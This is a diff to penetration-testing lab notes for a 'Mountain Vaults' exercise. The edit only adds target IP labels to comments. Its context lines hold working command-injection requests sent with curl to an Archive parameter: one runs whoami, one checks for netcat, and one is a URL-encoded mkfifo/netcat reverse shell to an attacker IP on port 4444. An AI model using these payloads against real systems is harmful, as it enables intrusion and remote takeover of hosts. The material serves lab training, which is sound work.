@@ -255,7 +255,7 @@ Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2).
 >Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
 ># =====================================
 >
-># Verify command injection by appending ';whoami' to the Archive parameter (URL encoded)
+># Verify command injection by appending ';whoami' to the Archive parameter (URL encoded) (Target: 192.168.110.16)
 >curl -X POST --data 'Archive=git%3Bwhoami' http://192.168.110.16:80/archive
 >
 ># ========== Expected Result ==========
@@ -266,7 +266,7 @@ Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2).
 >stanley
 ># =====================================
 >
-># Check if 'nc' (netcat) is installed on the target system, which is required for reverse shell
+># Check if 'nc' (netcat) is installed on the target system, which is required for reverse shell (Target: 192.168.110.16)
 >curl -X POST --data 'Archive=git%3Bwhich%20nc' http://192.168.110.16:80/archive
 >
 ># ========== Expected Result ==========
@@ -281,7 +281,7 @@ Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2).
 ># - Remove any existing named pipe (/tmp/f)
 ># - Create a named pipe at /tmp/f
 ># - Use the pipe to send a shell to the attacker using Netcat
-># - Connects back to the attacker's machine on port 4444 (Kali IP: 192.168.45.203)
+># - Connects back to the attacker's machine on port 4444 (Target: 192.168.110.16, Kali IP: 192.168.45.203)
 >curl -X POST --data 'Archive=git%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.45.203%204444%20%3E%2Ftmp%2Ff' http://192.168.110.16:80/archive
 >
 ># ========== Expected Result ==========
